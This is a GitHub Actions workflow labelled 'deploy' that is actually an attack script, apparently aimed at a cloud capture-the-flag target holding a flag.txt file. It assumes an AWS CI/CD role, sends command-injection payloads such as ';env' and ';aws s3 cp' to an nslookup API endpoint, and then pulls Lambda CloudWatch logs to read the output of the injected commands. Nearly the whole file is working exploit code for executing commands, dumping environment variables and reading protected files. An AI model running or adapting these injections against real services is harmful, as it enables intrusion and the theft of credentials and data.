name: deploy
on:
  push:
    branches:
      - corgi
jobs:
  aws:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Get AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: AWS identity
        run: aws sts get-caller-identity

      - name: Try direct flag read with cicdRole first (cheap check)
        run: |
          aws s3 cp s3://codec4f26c862a321ef5/flag.txt - || echo "cicdRole cannot read flag.txt directly"

      - name: Trigger nslookup injection (no space needed before ;)
        run: |
          echo "===== injection: env ====="
          curl -s -i -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" \
            -d '{"domain":";env"}'
          echo
          echo "===== injection: try reading flag via lambdaRole, write to /tmp ====="
          curl -s -i -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" \
            -d '{"domain":";aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt --region us-east-1"}'
          echo
          echo "===== injection: aws s3 ls to confirm command execution works at all ====="
          curl -s -i -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" \
            -d '{"domain":";aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1"}'

      - name: Wait a moment for async log delivery
        run: sleep 5

      - name: Read Lambda CloudWatch logs (this is where output actually goes)
        run: |
          echo "===== log streams ====="
          aws logs describe-log-streams \
            --log-group-name /aws/lambda/nslookupv2 \
            --order-by LastEventTime --descending --limit 3 || true

          LATEST=$(aws logs describe-log-streams \
            --log-group-name /aws/lambda/nslookupv2 \
            --order-by LastEventTime --descending --limit 1 \
            --query 'logStreams[0].logStreamName' --output text 2>/dev/null)

          echo "Latest stream: $LATEST"

          echo "===== log events ====="
          aws logs get-log-events \
            --log-group-name /aws/lambda/nslookupv2 \
            --log-stream-name "$LATEST" \
            --limit 50 || true
